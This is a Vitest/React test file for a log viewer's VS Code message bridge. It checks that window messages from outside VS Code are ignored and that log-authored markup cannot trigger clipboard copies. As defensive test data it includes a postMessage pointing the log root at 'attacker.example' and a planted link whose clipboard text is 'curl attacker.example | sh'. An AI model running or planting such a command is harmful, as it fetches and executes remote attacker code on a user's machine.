// @vitest-environment jsdom
import { act, cleanup, render } from "@testing-library/react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import { getVscodeApi } from "@tsmono/util";

import { initializeStore } from "../state/store";

import { AppContent } from "./App";

// Only the host-message bridge is under test: stub the router and the fetch
// engine so <AppContent> mounts on its own.
vi.mock("react-router/dom", () => ({ RouterProvider: () => null }));
const navigate = vi.hoisted(() => vi.fn(() => Promise.resolve()));
vi.mock("./routing/AppRouter.tsx", () => ({
  getAppRouter: () => ({ navigate }),
}));

const invalidateLogListing = vi.hoisted(() => vi.fn());
vi.mock("../log_data", () => ({
  FetchEngineController: () => null,
  imperativeLogData: { invalidateLogListing },
}));

const setLogRoot = vi.hoisted(() => vi.fn());
vi.mock("../app_config", async (importOriginal) => ({
  ...(await importOriginal<typeof import("../app_config")>()),
  setLogRoot,
}));

vi.mock("@tsmono/util", async (importOriginal) => ({
  ...(await importOriginal<typeof import("@tsmono/util")>()),
  getVscodeApi: vi.fn(),
}));

const hostApi = { postMessage: vi.fn(), getState: vi.fn(), setState: vi.fn() };

const postHostMessage = (data: unknown) => {
  act(() => {
    window.dispatchEvent(new MessageEvent("message", { data }));
  });
};

beforeEach(() => {
  initializeStore({
    downloadFiles: false,
    downloadLogs: false,
    webWorkers: false,
    streamSamples: false,
  });
});

afterEach(() => {
  cleanup();
  vi.clearAllMocks();
  vi.restoreAllMocks();
});

describe("in VS Code", () => {
  beforeEach(() => {
    vi.mocked(getVscodeApi).mockReturnValue(hostApi);
  });

  it("backgroundUpdate refreshes the listing and leaves the selected log alone", () => {
    // The host posts backgroundUpdate while the webview is unfocused.
    vi.spyOn(document, "hasFocus").mockReturnValue(false);
    render(<AppContent />);

    postHostMessage({
      type: "backgroundUpdate",
      url: "/logs/new.eval",
      log_dir: "file:///logs",
    });

    expect(navigate).not.toHaveBeenCalled();
    expect(invalidateLogListing).toHaveBeenCalledTimes(1);
  });

  it("updateState re-points the log root at the host's file", () => {
    render(<AppContent />);

    postHostMessage({ type: "updateState", url: "file:///other/run.eval" });

    expect(setLogRoot).toHaveBeenCalledWith("file:///other");
    expect(navigate).toHaveBeenCalledWith("/logs/run.eval", { replace: true });
  });

  it("does not navigate again when the host replays its command on focus", () => {
    render(<AppContent />);
    const command = { type: "updateState", url: "file:///logs/new.eval" };
    postHostMessage(command);
    postHostMessage(command);
    expect(navigate).toHaveBeenCalledTimes(1);
  });
});

describe("outside VS Code", () => {
  beforeEach(() => {
    vi.mocked(getVscodeApi).mockReturnValue(undefined);
  });

  it("ignores window messages: an embedding page can't choose the log location", () => {
    render(<AppContent />);

    postHostMessage({
      type: "updateState",
      url: "https://attacker.example/logs/run.eval",
    });
    postHostMessage({
      type: "backgroundUpdate",
      url: "/logs/new.eval",
      log_dir: "file:///logs",
    });

    expect(setLogRoot).not.toHaveBeenCalled();
    expect(navigate).not.toHaveBeenCalled();
    expect(invalidateLogListing).not.toHaveBeenCalled();
  });
});

describe("log-authored markup", () => {
  // jsdom has no clipboard; a delegate-based copier falls back to
  // document.execCommand("copy"), which is the observable we deny.
  const execCommand = vi.fn(() => true);
  // What a sanitized MathJax \href payload can plant in the DOM.
  const planted = document.createElement("a");
  planted.className = "copy-button";
  planted.setAttribute("data-clipboard-text", "curl attacker.example | sh");
  planted.textContent = "harmless-looking link";

  beforeEach(() => {
    Object.defineProperty(document, "execCommand", {
      value: execCommand,
      configurable: true,
    });
    document.body.appendChild(planted);
  });
  afterEach(() => {
    planted.remove();
    // jsdom defines no execCommand, so restoring means removing the property.
    delete (document as Partial<Document>).execCommand;
  });

  it("cannot trigger a clipboard write by carrying copy-button classes", () => {
    vi.mocked(getVscodeApi).mockReturnValue(undefined);
    render(<AppContent />);

    act(() => {
      planted.click();
    });

    expect(execCommand).not.toHaveBeenCalled();
  });
});
